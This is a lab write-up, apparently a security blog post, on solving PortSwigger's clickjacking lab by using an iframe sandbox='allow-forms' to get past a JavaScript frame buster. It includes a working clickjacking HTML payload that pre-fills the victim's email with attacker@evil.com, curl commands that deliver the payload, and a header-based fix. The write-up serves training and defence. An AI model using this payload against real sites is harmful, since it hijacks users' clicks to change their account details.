---
layout: post
title: "PortSwigger: Clickjacking with a Frame Buster Script"
date: 2027-07-24 09:00:00 -0500
categories: [Web Security, Clickjacking]
tags: [portswigger, clickjacking, ui-redressing, frame-buster, sandbox, iframe, web]
---

## Lab Summary

**Lab:** Clickjacking with a frame buster script  
**Difficulty:** Practitioner  
**CWE:** [CWE-1021](https://cwe.mitre.org/data/definitions/1021.html) – Improper Restriction of Rendered UI Layers  
**Result:** Solved

---

## The Vulnerability

[Clickjacking](https://cwe.mitre.org/data/definitions/1021.html) overlays a transparent `<iframe>` of a real authenticated page on top of a decoy "Click me" prompt. The victim clicks what looks like a harmless button but actually triggers a state-changing action inside the hidden frame — in this case, changing their account email address.

This lab adds a twist: the target page deploys a **JavaScript frame buster** to detect when it's inside a frame and refuse to render.

```js
if (top != self) {
    window.addEventListener("DOMContentLoaded", function () {
        document.body.innerHTML = 'This page cannot be framed';
    }, false);
}
```

If the page detects it is not the top-level frame (`top != self`), it wipes the body on DOM load. Standard clickjacking fails immediately.

---

## The Bypass: `sandbox="allow-forms"`

The HTML `sandbox` attribute on an `<iframe>` restricts what the embedded content can do. The key insight: **`sandbox="allow-forms"` enables HTML5 form submission but omits `allow-scripts`**, so **no JavaScript runs inside the frame at all** — including the frame buster.

| Sandbox token | Allows |
|---|---|
| `allow-scripts` | JavaScript execution |
| `allow-forms` | HTML5 form submission |
| `allow-same-origin` | Cookie/session access |

By sandboxing without `allow-scripts`, the frame buster script is neutralised while the victim's click on the "Update email" button still submits the form with their authenticated CSRF token. The server sees a valid same-origin POST and processes it.

---

## Exploit

### 1. Pre-fill the target form via URL parameter

The account page accepts an email GET parameter that pre-populates the email field:

```
GET /my-account?email=attacker@evil.com
```

This means the victim never has to type anything — the attacker's email is already in the field when the page loads inside the frame.

### 2. Measure the button position

The pixel alignment of the decoy must match the real "Update email" button position at the iframe's viewport width. Measured with headless Chromium at a 700 px viewport:

- **top:** 443 px  
- **left:** 32 px

### 3. Build and deliver the payload

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 443px;
        left: 32px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
  src="https://TARGET/my-account?email=attacker@evil.com"></iframe>
```

The iframe is nearly invisible (`opacity: 0.0001`) but sits on top (`z-index: 2`). The "Click me" label is visible at `z-index: 1`. When the victim clicks the label, the click event passes through to the iframe and lands on the "Update email" button, submitting the pre-filled form.

Store the payload on the exploit server and deliver it to the victim:

```bash
curl -sk -X POST 'https://<exploit_server>/' \
  --data-urlencode 'responseFile=/exploit' \
  --data-urlencode 'responseHead=HTTP/1.1 200 OK' \
  --data-urlencode "responseBody=$(cat payload.html)" \
  --data-urlencode 'formAction=STORE'

curl -L 'https://<exploit_server>/deliver-to-victim'
```

---

## Why It Worked

The frame buster relies entirely on JavaScript. The `sandbox` attribute gives the attacker direct, declarative control over which browser capabilities are active inside the frame — and JavaScript is opt-in under `sandbox`. Without `allow-scripts`, the `DOMContentLoaded` listener never fires, the body is never replaced, and the form loads normally with the victim's active session.

The CSRF token is not a defence here: the form submission originates from inside the same-origin iframe, so the browser attaches the victim's real CSRF token automatically. The server cannot distinguish this click from a legitimate one.

---

## Fix

JavaScript frame busters are an unreliable defence. Reliable protection requires server-side HTTP headers:

```
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

These headers prevent the browser from loading the page inside any frame at all, regardless of what the attacker sets on the iframe element. A sandboxed `allow-forms` iframe cannot override them.
